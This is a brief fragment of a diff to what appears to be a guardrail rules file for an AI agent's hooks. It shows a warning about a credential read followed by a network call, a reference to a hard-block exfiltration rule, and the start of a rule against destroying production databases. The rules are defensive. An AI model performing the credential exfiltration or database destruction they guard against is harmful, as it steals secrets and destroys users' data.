+    message: "Cross-call correlation: an earlier hook call this session read a credential-shaped path; this call looks network-shaped. If unrelated, this is a false positive - see no-exfil-flow for the hard-block version of this pattern."
 
   - id: prod-db-destruction
     type: command
